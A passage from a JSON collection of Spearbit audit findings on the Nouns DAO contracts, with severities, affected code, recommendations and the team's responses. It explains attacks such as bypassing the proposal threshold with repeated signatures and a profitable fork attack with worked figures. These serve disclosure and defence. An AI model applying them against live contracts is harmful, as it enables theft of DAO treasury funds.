      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21344",
      "title": "Private keys are read from the .env environment variable in the deployment scripts",
      "impact": "LOW",
      "content": "## Security Risk Assessment Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `DeployDAOV3NewContractsBase.s.sol#L53`\n- `ProposeENSReverseLookupConfigMainnet.s.sol#L18`\n- `DeployDAOV3DataContractsBase.s.sol#L21`\n- `ProposeDAOV3UpgradeMainnet.s.sol#L24`\n- `ProposeDAOV3UpgradeTestnet.s.sol#L32`\n- `ProposeTimelockMigrationCleanupMainnet.s.sol#L22`\n\n## Description\nIt has been identified that the private key of privileged (`PROPOSER_KEY` and `DEPLOYER_PRIVATE_KEY`) accounts are read from the environment variables within scripts. The deployer address is verified on Etherscan as **Nouns DAO: Deployer**. Additionally, since the proposal is made by the account that owns the `PROPOSER_KEY`, it can be assumed that the proposer owns at least some Nouns. Given the privileged status of the deployer and the proposer, unauthorized access to this private key could have a negative impact on the reputation of the Nouns DAO.\n\nThe present method of managing private keys, i.e., through environment variables, represents a potential security risk. This is due to the fact that any program or script with access to the process environment can read these variables.\n\nAs mentioned in the Foundry documentation:\n>This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local/test setups. For production setups please review the various wallet options that Foundry supports.\n\n## Recommendation\nConsider employing alternative methods to load the private keys in the deployment scripts. Some alternatives as suggested in the ETHSecurity channel include:\n1. AWS Secret Manager\n2. AWS CloudHSM\n3. AWS KMS External Key Store (XKS)\n4. AWS Nitro Enclaves\n\n## Nouns\nThe `PROPOSER_KEY` doesn't need to necessarily own Nouns; it can be delegated some voting power. In any case, we will consider changing this, but for now, we won't fix.\n\n## Spearbit\n**Acknowledged.**",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21343",
      "title": "The try-catch block at NounsAuctionHouseFork will only catch errors that contain strings",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nNounsAuctionHouseFork.sol#L213-L229\n\n## Description\nThis issue has been previously identified and documented in the Nouns Builder Code4rena Audit. The catch `Error(string memory)` within the `try/catch` block in the `_createAuction` function only catches reverts that include strings. At present, in the current version of the NounsAuctionHouseFork, there are no reverts without a string.\n\nHowever, given that the NounsAuctionHouseFork and the NounsTokenFork contracts are meant to be upgradeable, if a future upgrade in the `NounsTokenFork:mint()` method replaces the `require` statements with custom errors, the existing catch statement won't be able to handle the reverts, potentially leading to a faulty state of the contract.\n\nHere's an example illustrating that the `catch Error(string memory)` won't catch reverts with custom errors that don't contain strings:\n\n```solidity\ncontract Test1 {\n    bool public error;\n    Test2 test;\n    \n    constructor() {\n        test = new Test2();\n    }\n    \n    function testCustomErr() public {\n        try test.revertWithRevert() {\n        } catch Error(string memory) {\n            error = true;\n        }\n    }\n    \n    function testRequire() public {\n        try test.revertWithRequire() {\n        } catch Error(string memory) {\n            error = true;\n        }\n    }\n}\n\ncontract Test2 {\n    error Revert();\n    \n    function revertWithRevert() public {\n        revert Revert();\n    }\n    \n    function revertWithRequire() public {\n        require(true == false, \"a\");\n    }\n}\n```\n\n## Recommendation\nIf the `NounsTokenFork:mint()` methods of the NounsTokenFork change to include custom errors as the revert reason, it is recommended to modify the `catch Error(string memory)` to also catch errors that don't contain strings. \n\nHowever, it is not advisable to change `catch Error(string memory)` to `catch`, as this modification could unintentionally capture unwanted reverts, such as those due to an out-of-gas condition.\n\n## Nouns\nWe will take this into consideration if the errors change from strings to custom errors. For now, we won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21342",
      "title": "Veto renouncing in the original DAO or rage quit blocking in a forked DAO as a result of any future proposals will open up the way for 51% attacks",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `NounsDAOLogicV2.sol#L900-L915`\n- `NounsDAOV3Admin.sol#L318-L333`\n- `NounsDAOLogicV1Fork.sol#L195-L222`\n\n## Description\nIt is possible to renounce veto power in V1, V2, and V3 versions of the protocol or upgrade forked V1 to block or remove rage quit. While it is a part of standard workflow, these operations are irreversible and open up a possibility of all variations of 51% attack. As a simplest example, in the absence of veto functionality, a majority can introduce and execute a proposal to move all DAO treasury funds to an address they control. Also, there is a related vector, incentivized bad faith voting.\n\n### _burnVetoPower() exists in V1, V2, and V3:\n\n#### In NounsDAOLogicV1:\n```solidity\n/**\n * @notice Burns veto privileges\n * @dev Vetoer function destroying veto power forever\n */\nfunction _burnVetoPower() public {\n    // Check caller is pendingAdmin and pendingAdmin address(0)\n    require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only ');\n    _setVetoer(address(0));\n}\n```\n\n#### In NounsDAOLogicV2:\n```solidity\n/**\n * @notice Burns veto privileges\n * @dev Vetoer function destroying veto power forever\n */\nfunction _burnVetoPower() public {\n    // Check caller is vetoer\n    require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only ');\n    // Update vetoer to 0x0\n    emit NewVetoer(vetoer, address(0));\n    vetoer = address(0);\n    // Clear the pending value\n    emit NewPendingVetoer(pendingVetoer, address(0));\n    pendingVetoer = address(0);\n}\n```\n\n#### In NounsDAOLogicV3:\n```solidity\n/**\n * @notice Burns veto privileges\n * @dev Vetoer function destroying veto power forever\n */\nfunction _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public {\n    // Check caller is vetoer\n    require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only ');\n    // Update vetoer to 0x0\n    emit NewVetoer(ds.vetoer, address(0));\n    ds.vetoer = address(0);\n    // Clear the pending value\n    emit NewPendingVetoer(ds.pendingVetoer, address(0));\n    ds.pendingVetoer = address(0);\n}\n```\n\nAlso, `veto()` was removed from `NounsDAOLogicV1Fork`, and the only mitigation to the same attack is `rage quit()`:\n\n#### NounsDAOLogicV1Fork.sol#L195-L222\n```solidity\n/**\n * @notice A function that allows token holders to quit the DAO, taking their pro rata funds,\n * and sending their tokens to the DAO treasury.\n * Will revert as long as not all tokens were claimed, and as long as the delayed governance has\n * not expired.\n * @param tokenIds The token ids to quit with\n */\nfunction quit(uint256[] calldata tokenIds) external nonReentrant {\n    checkGovernanceActive();\n    uint256 totalSupply = adjustedTotalSupply();\n\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n        nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n    }\n    \n    for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) {\n        IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]);\n        uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) /\n            totalSupply;\n        bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend);\n        if (!erc20Sent) revert QuitERC20TransferFailed();\n    }\n\n    uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n    bool ethSent = timelock.sendETH(msg.sender, ethToSend);\n    if (!ethSent) revert QuitETHTransferFailed();\n\n    emit Quit(msg.sender, tokenIds);\n}\n```\n\nThis means that any malfunction in this function, for example, if USDC is added to `erc20TokensToIncludeInQuit`, while a minority of forked nouns holders was previously blacklisted by the USDC contract, will open up the possibility of a majority attack on them. That is, there will be no way to stop any majority-backed malicious proposal from affecting the DAO-held funds of such holders.\n\nNouns holders that aren't aware enough of the importance of functioning `veto()` for the original DAO and `quit()` for the forked DAO can pass a proposal that renounces veto or [fully or partially] blocks `quit()`, enabling the 51% attack. Such change will be irreversible, and if a majority forms and acts before any similar mitigation functionalities can be reinstalled, the whole DAO funds of the rest of the holders can be lost.\n\nPer very low likelihood (which increases with the switch from `veto()` to `quit()` as a safeguard), and high funds loss impact, setting the severity to be low.\n\n## Recommendation\nKey mitigation here is educating the holders on the roles of these two functions. The surface will not exist as long as most of the holders are aware of the possibility of the attack and these guards being in place and reject any proposal affecting them. \n\nConsider highlighting `_burnVetoPower()` effect on opening 51% attack vector for original DAOs, and emphasizing the availability of forked DAO `quit()` as the only safeguard in place against the same vector. \n\nNote that with the absence of `veto()` in the forked DAO, there will be a wider range of possible changes that have the potential to create this vector (not only `quit()` removal, but `quit()` blocking for any reason).\n\n## Nouns\nThe DAO members are well aware of the risk of 51% attack and the importance of veto and fork/quit options. We will make sure this stays in awareness of all members.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21341",
      "title": "Setting NounsAuctionHouse's timeBuffer too big is possible, which will freeze bidder's funds",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity: Low Risk\n\n### Context\nNounsAuctionHouse.sol#L161-L169\n\n### Description\nIt's now possible to set `timeBuffer` to an arbitrary big value with `setTimeBuffer()`, there is no control:\n\n```solidity\n/**\n * @notice Set the auction time buffer.\n * @dev Only callable by the owner.\n */\nfunction setTimeBuffer(uint256 _timeBuffer) external override onlyOwner {\n    timeBuffer = _timeBuffer;\n    emit AuctionTimeBufferUpdated(_timeBuffer);\n}\n```\n\nThis can freeze user funds as `NounsAuctionHouse` holds the current bid, but its release is conditional to `block.timestamp >= _auction.endTime`:\n\n```solidity\nfunction settleAuction() external override whenPaused nonReentrant {\n    _settleAuction();\n}\n```\n\n```solidity\nfunction _settleAuction() internal {\n    INounsAuctionHouse.Auction memory _auction = auction;\n    require(_auction.startTime != 0, \"Auction hasn't begun\");\n    require(!_auction.settled, 'Auction has already been settled');\n    require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\");\n    auction.settled = true;\n    if (_auction.bidder == address(0)) {\n        nouns.burn(_auction.nounId);\n    } else {\n        nouns.transferFrom(address(this), _auction.bidder, _auction.nounId);\n    }\n}\n```\n\nThis can be set to be an arbitrarily big value, say `10^6` years, effectively freezing the current bidder's funds:\n\n```solidity\nfunction createBid(uint256 nounId) external payable override nonReentrant {\n    ...\n    // Extend the auction if the bid was received within `timeBuffer` of the auction end time\n    bool extended = _auction.endTime - block.timestamp < timeBuffer;\n    if (extended) {\n        auction.endTime = _auction.endTime = block.timestamp + timeBuffer;\n    }\n}\n```\n\nI.e., the permissionless `settleAuction()` mechanics will be disabled. The current bidder's funds will be frozen for an arbitrary time. As the new setting needs to pass voting, the probability is very low. At the same time, it is higher for any forked DAO than for the original one, so while the issue is present in V1 and V2, it becomes more severe in V3 in the context of the forked DAO. The impact is high, being a long-term freeze of the bidder's native tokens.\n\n### Recommendation\nConsider introducing an upper limit to `timeBuffer`, say 1 day.\n\n### Nouns\nAt this point, due to this requiring going through a DAO proposal, we'll leave it as won't fix.\n\n### Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21340",
      "title": "Attacker can utilize bear market conditions to profit from forking the Nouns DAO",
      "impact": "LOW",
      "content": "## Security Analysis Report\n\n## Severity\n**Low Risk**\n\n## Context\n`NounsDAOV3Fork.sol#L212-L231`\n\n## Description\nAn economic attack vector has been identified that could potentially compromise the integrity of the Nouns DAO treasury, specifically due to the introduction of forking functionality. Currently, the treasury holds approximately $24,745,610.99 in ETH and about $27,600,000 in STETH. There are roughly 738 nouns tokens.\n\nAs per OpenSea listings, the cheapest nouns-token can be purchased for about 31 ETH, approximately $53,000. Meanwhile, the daily auction price for the nouns stands at approximately 28 ETH, which equals about $48,600.\n\nA prospective attacker may exploit the current bear market conditions, marked by discounted price, to buy multiple nouns-tokens at a low price, execute a fork to create a new DAO and subsequently claim a portion of the treasury. This act would result in the attacker gaining more than they invested at the expense of the Nouns DAO treasury.\n\nTo illustrate, if the forking threshold is established at 20%, an attacker would need 148 nouns to execute a fork. Consider the scenario where a user purchases 148 nouns for a total of 4588 ETH (148 x 31 ether). The `forkTreasury.balance` would be 2679.27 ETH, and the `contract_stETH.balanceOf(forkTreasury)` would stand at 3000.7 ETH. The total ETH obtained would amount to 5680.01 ETH, thereby yielding a profit of 1092 ETH ($2,024,568).\n\n## Recommendation\nConsider updating the original DAO auction house reserve price and evaluate market-controlling initiatives, such as nouns buybacks with treasury funds and their subsequent burning (given low market prices it will be a profit-generating activity in terms of nouns valuation).\n\n## Nouns\nWe are aware of the incentives the fork mechanism creates. For now, we will not introduce any more changes, but this is a topic that will continue to be discussed.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21339",
      "title": "Proposal threshold can be bypassed through the proposeBySigs() function",
      "impact": "MEDIUM",
      "content": "## Risk Assessment\n\n## Severity: Medium Risk\n\n### Context\nNounsDAOV3Proposals.sol#L229\n\n### Description\nThe function `proposeBySigs()` allows users to delegate their voting power to a proposer through signatures so the proposer can create a proposal. The only condition is that the sum of the signers voting power should be higher than the proposal threshold.\n\nIn the line `uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;`, the `ds.proposalCount` is increased but the proposal has not been created yet, meaning that the `NounsDAOStorageV3.Proposal` struct is, at this point, uninitialized. So when the `checkNoActiveProp()` function is called, the proposal state is `DEFEATED`. \n\nAs the proposal state is `DEFEATED`, the `checkNoActiveProp()` call would not revert in the case that a signer is repeated in the `NounsDAOStorageV3.ProposerSignature[]` array:\n\n```solidity\nfunction checkNoActiveProp(NounsDAOStorageV3.StorageV3 storage ds, address proposer) internal view {\n    uint256 latestProposalId = ds.latestProposalIds[proposer];\n    if (latestProposalId != 0) {\n        NounsDAOStorageV3.ProposalState proposersLatestProposalState = state(ds, latestProposalId);\n        if (\n            proposersLatestProposalState == NounsDAOStorageV3.ProposalState.ObjectionPeriod ||\n            proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Active ||\n            proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Pending ||\n            proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Updatable\n        ) revert ProposerAlreadyHasALiveProposal();\n    }\n}\n```\n\nBecause of this, it is possible to bypass the proposal threshold and create any proposal by signing multiple `proposerSignatures` with the same signer over and over again. This would keep increasing the total voting power accounted by the smart contract until this voting power is higher than the proposal threshold.\n\n**Medium likelihood + Medium Impact = Medium severity.**\n\n### Recommendation\nConsider creating the proposal before verifying the `NounsDAOStorageV3.ProposerSignature[]` array by calling `createNewProposal()` before the `verifySignersCanBackThisProposalAndCountTheirVotes()` function. By doing this, when `verifySignersCanBackThisProposalAndCountTheirVotes()` is called, the proposal state will be correct and any repeated signer would cause a revert during the `checkNoActiveProp(ds, signer);` call.\n\n### Notes\n- **Nouns:** Followed Spearbit's recommendation and fixed the issue in PR 711.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about the function proposeBySigs() in the NounsDAOV3Proposals.sol#L229. It allows users to delegate their voting power to a proposer through signatures, with the only condition being that the sum of the signers' voting power should be higher than the proposal threshold. The bug is that the line uint256 proposalId = ds.proposalCount = ds.proposalCount + 1; increases the ds.proposalCount, but the proposal has not been created yet. This means that when the checkNoActiveProp() function is called, the proposal state is DEFEATED. As a result, the checkNoActiveProp() call would not revert in the case that a signer is repeated in the NounsDAOStorageV3.ProposerSignature[] array, allowing users to bypass the proposal threshold and create any proposal by signing multiple proposerSignatures with the same signer. This has a medium likelihood and a medium impact, making it a medium severity bug.\n\nThe recommendation is to consider creating the proposal before verifying the NounsDAOStorageV3.ProposerSignature[] array. This can be done by calling createNewProposal() before verifySignersCanBackThisProposalAndCountTheirVotes() function. By doing this, when verifySignersCanBackThisProposalAndCountTheirVotes() is called, the proposal state will be correct and any repeated signer would cause a revert during the checkNoActiveProp(ds, signer); call. Nouns followed Spearbit's recommendation and fixed the issue in PR 711, which was acknowledged.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21338",
      "title": "Missing check for vetoed proposal's target timelock can cancel transactions from other proposals on new DAO treasury",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `NounsDAOV3Proposals.sol#L527-L544`\n- `NounsDAOV3Proposals.sol#L435`\n- `NounsDAOV3Proposals.sol#L472`\n- `NounsDAOV3Proposals.sol#L590`\n\n## Description\nThe `veto()` function always assumes that the proposal being vetoed is targeting `ds.timelock` (i.e., the new DAO treasury) instead of checking via `getProposalTimelock()` as done by the `queue()`, `execute()`, and `cancel()` functions. If the proposal being vetoed were targeting `timelockV1` (i.e., the original DAO treasury), then this results in calling `cancelTransaction()` on the wrong timelock which sets `queuedTransactions[txHash]` to false for values of `target`, `value`, `signature`, `data`, and `eta`.\n\nThe proposal state is vetoed with zombie queued transactions on `timelockV1`, which will never get executed. However, if there coincidentally were valid transactions with the same values (of `target`, `value`, `signature`, `data`, and `eta`) from other proposals queued (assuming in the same block and that both timelocks have the same delay so that `eta` is the same) on `ds.timelock`, then those would unexpectedly and incorrectly get dequeued and will not be executed, even when these other `ds.timelock` targeting proposals were neither vetoed nor cancelled. Successfully voted proposals on the new DAO treasury have their transactions cancelled before execution.\n\n**Confirmed with PoC:** `veto_poc.txt`\n\n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\nCheck the vetoed proposal's target timelock via `getProposalTimelock()` and use that as done by `queue()`, `execute()`, and `cancel()` functions.\n\n## Nouns: Mitigation\nPR 715.\n\n## Spearbit\nVerified that PR 715 fixes the issue as recommended.",
      "summary": "\nThis bug report is about an issue with the NounsDAOV3Proposals.sol code. The veto() function always assumes that the proposal being vetoed is targeting the new DAO treasury instead of checking via getProposalTimelock() as done by the queue(), execute() and cancel() functions. This could result in calling cancelTransaction() on the wrong timelock, setting the queuedTransactions[txHash] to false for values of target, value, signature, data and eta. The proposal state is vetoed with zombie queued transactions on timelockV1 which will never get executed. \n\nThe severity of this bug is Medium Risk, with Low likelihood and High impact. A proof of concept was conducted to confirm the issue, and a mitigation was recommended in the form of PR 715. This was verified to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21337",
      "title": "A malicious new DAO can prevent/deter token holders from rage quitting by including arbitrary addresses in erc20TokensToIncludeInQuit",
      "impact": "MEDIUM",
      "content": "## Medium Risk Vulnerability Report\n\n## Severity \n**Medium Risk**\n\n## Context \n`NounsDAOLogicV1Fork.sol#L201-L215`\n\n## Description \nAs described in the fork spec: \n\n> \"New DAOs are deployed with vanilla ragequit in place; otherwise it's possible for a new DAO majority to collude to hurt a minority, and the minority wouldn't have any last resort if they can't reach the forking threshold; furthermore, bullies/attackers can recursively chase minorities into fork DAOs in an undesired attrition war.\"\n\nHowever, a malicious new DAO may include arbitrary addresses in `erc20TokensToIncludeInQuit` (modifiable via `_setErc20TokensToIncludeInQuit()`) that revert on `balanceOf()` or `transfer()` calls to prevent token holders from rage quitting. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. \n\nAlso, it is not certain that all governance proposals undergo thorough scrutiny of security properties, which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates and rage quit before such a proposal takes effect.\n\nFurthermore, a rage quitting token holder may not necessarily want to receive all the DAO's ERC20 tokens for various reasons. For example, custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions.\n\n1. A malicious new DAO can prevent unsuspecting/inattentive token holders from rage quitting and taking out their pro rata funds, which is a critical capability for minority protection as specified. \n2. A rage quitting token holder is forced to receive all the DAO's ERC20 tokens without having a choice, which may deter them from quitting.\n\n## Recommendation \nConsider accepting an ERC20 token list, which is a subset of `erc20TokensToIncludeInQuit`, from the user to allow them to choose/skip ERC20 tokens.\n\n## Nouns \n**Fix:** PR 732.\n\n## Spearbit \nVerified that PR 732 fixes the issue as recommended.",
      "summary": "\nThis bug report is about the erc20TokensToIncludeInQuit variable in NounsDAOLogicV1Fork.sol. It has a medium risk severity. The issue is that a malicious new DAO can include arbitrary addresses in erc20TokensToIncludeInQuit, which can prevent token holders from rage quitting and taking out their pro rata funds. Furthermore, a rage quitting token holder is forced to receive all the DAO's ERC20 tokens without having a choice.\n\nTo fix this issue, it is recommended to consider accepting an ERC20 token list, which is a subset of erc20TokensToIncludeInQuit, from the user to allow them to choose/skip ERC20 tokens. This fix was implemented in PR 732 and verified that it fixes the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21336",
      "title": "A malicious DAO can prevent/deter token holders from executing/joining a fork by including arbitrary addresses in erc20TokensToIncludeInFork",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nNounsDAOV3Fork.sol#L224-L228\n\n## Description\nAs motivated in the fork spec, forking is a minority protection mechanism that should always allow a group of minority token holders to exit together into a new instance of Nouns DAO. However, a malicious majority in the original DAO may include arbitrary addresses in `erc20TokensToIncludeInFork` (modifiable via `_setErc20TokensToIncludeInFork()`) that revert on `balanceOf()` or `transfer()` calls to prevent token holders from executing or joining a fork. \n\nWhile the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect.\n\nFurthermore, a forking token holder may not necessarily want to receive all the DAO's ERC20 tokens in their new fork DAO for various reasons. For example, custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions, and so they may not want to interact with a DAO whose treasury holds such tokens and may send them at some point (e.g., rage quit). Minority token holders may even want to fork specifically because of an ERC20's presence or proposed inclusion in the DAO treasury.\n\nGiving forking holders a choice of ERC20s to take to fork DAO gives them a choice to fork anytime only with ETH and a subset of approved tokens if the DAO has already managed to add malicious/contentious ERC20s to the list.\n\n1. A malicious DAO can prevent unsuspecting/inattentive or future token holders from forking and taking out their pro rata funds, which is the main motivation for minority protection as specified.\n2. A forking token holder is forced to end up with a fork DAO treasury that has all the original DAO's ERC20 tokens without having a choice, which may deter them from creating/executing/joining a fork in the first place.\n\nLow likelihood + High impact = Medium severity.\n\n## Recommendation\nReconsider the design choice and threat/trust models to evaluate the feasibility of a better one, e.g., when a fork gets triggered, the first caller of `escrowToFork()` (the initiator) could get to choose a subset of `erc20TokensToIncludeInFork` for their fork, after which `executeFork()` and `allJoinFork()` would only send those tokens to the fork DAO treasury.\n\n## Responses\n**Nouns:**  \nWon't fix. We see the risk of adding a malicious token to `erc20TokensToIncludeInQuit` to be low, because it needs to go through a proposal process which is being reviewed by the DAO members. In addition, we don't want to give the first caller of `escrowToFork` special privileges that may not be in agreement with other members who wish to fork.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "\nThis bug report is about the NounsDAOV3Fork.sol#L224-L228, which is a minority protection mechanism that should always allow a group of minority token holders to exit together into a new instance of Nouns DAO. However, a malicious majority in the original DAO may include arbitrary addresses in erc20TokensToIncludeInFork, which could prevent token holders from executing or joining a fork. This has a low likelihood but a high impact, leading to a medium severity. \n\nThe risk of adding a malicious token to erc20TokensToIncludeInQuit is seen as low, as it needs to go through a proposal process which is being reviewed by the DAO members. Additionally, giving the first caller of escrowToFork special privileges may not be in agreement with other members who wish to fork. \n\nTo mitigate this risk, it is recommended that when a fork gets triggered, the first caller of escrowToFork should be able to choose a subset of erc20TokensToIncludeInFork for their fork, after which executefork() and alljoinFork() s only send those tokens to the fork DAO treasury.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21335",
      "title": "A malicious DAO can prevent forking by manipulating the forkThresholdBPS value",
      "impact": "MEDIUM",
      "content": "## Severity Report\n\n## Severity\n**Medium Risk**\n\n## Context\nNounsDAOV3Admin.sol#L530-L537\n\n## Description\nWhile some of the documentation, see [1](#) and [2](#), note that the fork threshold is expected to be 20%, the `forkThresholdBPS` is a DAO governance controlled value that may be modified via `_setForkThresholdBPS()`. \n\nA malicious majority can prevent forking at any time by setting the `forkThresholdBPS` to an unreasonably high value that is >= majority voting power. For a fork that is slowly gathering support via escrowing (thus giving time for a DAO proposal to be executed), a malicious majority can reactively manipulate `forkThresholdBPS` to prevent that fork from being executed.\n\nWhile the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties and their impacts. Token holders need to actively monitor all proposals for malicious updates to create, execute, and join a fork before such a proposal takes effect.\n\nA malicious majority can prevent a minority from forking by manipulating the `forkThresholdBPS` value.  \n**Low likelihood + High impact = Medium severity.**\n\n## Recommendation\nMitigation options:\n1. Consider a `MAX_FORK_THRESHOLD` value e.g. 50% for `forkThresholdBPS`.\n2. Consider preventing the increase of `forkThresholdBPS` if a fork is in the escrow period.\n\n## Nouns\nWe don't think a maximum value is needed here. If a malicious majority can set this value to be unreasonably high without the minority noticing, it's likely they would also be able to upgrade the DAO contracts without them noticing.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines the potential risk of a malicious majority manipulating the forkThresholdBPS value, which is a DAO governance controlled value. The forkThresholdBPS value is used to determine when a fork is executed. If the forkThresholdBPS is set to an unreasonably high value, the fork will not be executed. This poses a risk to minority token holders who may be unable to join a fork before the malicious proposal is executed. The severity of this issue is rated as Medium, as the likelihood of it occurring is low, but the impact is high. \n\nRecommendations to mitigate this risk include considering a MAX_FORK_THRESHOLD value, such as 50%, and preventing the increase of forkThresholdBPS if a fork is in the escrow period. It is also important for token holders to actively monitor all proposals for malicious updates.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21334",
      "title": "A malicious DAO can hold token holders captive by setting forkPeriod to an unreasonably low value",
      "impact": "MEDIUM",
